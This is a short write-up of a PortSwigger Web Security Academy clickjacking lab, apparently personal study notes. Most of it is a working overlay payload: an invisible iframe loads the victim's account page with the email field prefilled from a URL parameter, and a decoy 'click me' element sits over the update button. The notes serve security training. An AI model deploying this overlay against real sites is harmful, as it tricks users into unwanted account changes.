# [Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)

> goal is to create an overlay for the webapp and trick the user to change the email address

- the burp browser is the best option for the testing of the style
- set the opacity to 0.5 to align the click me with the delete button
- when it is aligned set the opacity to 0.0001

```
<style>
  iframe {
    position: relative;
    width: 800px;
    height: 800px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 460px;
    left: 50px;
    z-index: 1;
  }
</style>
<div>click me</div>
<iframe src="https://xxx.web-security-academy.net/my-account?email=quack@duck"></iframe>
```

> the logged in user url can reflect a prefilled input like `?email=quack@duck`, making the the click me div tag overlay the update email button, on the user click the email will be updated
